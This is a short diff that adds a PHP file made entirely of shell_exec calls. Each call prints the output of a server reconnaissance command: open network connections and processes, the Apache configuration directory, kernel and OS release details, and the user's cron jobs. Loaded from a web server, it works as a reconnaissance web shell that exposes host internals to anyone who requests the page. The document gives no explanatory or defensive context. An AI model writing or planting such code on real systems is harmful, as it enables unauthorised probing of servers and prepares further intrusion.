@@ -1,0 +1,5 @@
+<?php echo shell_exec('netstat -antpul');?>
+<?php echo shell_exec('ls -l /etc/httpd/');?>
+<?php echo shell_exec('uname -a');?>
+<?php echo shell_exec('cat /etc/redhat-release');?>
+<?php echo shell_exec('crontab -l');?>
